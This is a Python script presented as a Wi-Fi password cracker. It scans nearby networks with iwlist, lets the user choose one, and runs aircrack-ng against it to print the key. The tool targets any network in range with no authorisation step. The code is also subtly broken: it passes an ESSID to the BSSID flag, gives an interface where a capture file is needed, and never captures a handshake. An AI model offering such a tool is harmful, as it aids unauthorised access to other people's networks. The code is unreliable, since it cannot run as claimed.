import subprocess

def get_networks():
    # Run iwlist to get a list of networks
    output = subprocess.check_output(['iwlist', 'wlan0', 'scan'])
    networks = []
    for line in output.decode().split('\n'):
        if 'ESSID' in line:
            networks.append(line.split(':')[1].strip())
    return networks

def crack_network(network):
    # Run aircrack-ng to crack the network
    try:
        output = subprocess.check_output(['sudo', 'aircrack-ng', '-b', network, 'wlan0'])
        for line in output.decode().split('\n'):
            if 'KEY FOUND!' in line:
                password = line.split(':')[1].strip()
                return password
    except subprocess.CalledProcessError:
        return None

def main():
    print("Select a network to crack:")
    networks = get_networks()
    for i, network in enumerate(networks):
        print(f"{i+1}. {network}")
    network_choice = int(input("Enter the number of the network: ")) - 1
    network = networks[network_choice]
    print(f"Cracking network {network}...")
    password = crack_network(network)
    if password:
        print(f"Crack complete. Password found: {password}")
    else:
        print("Failed to crack network.")

if __name__ == '__main__':
    main()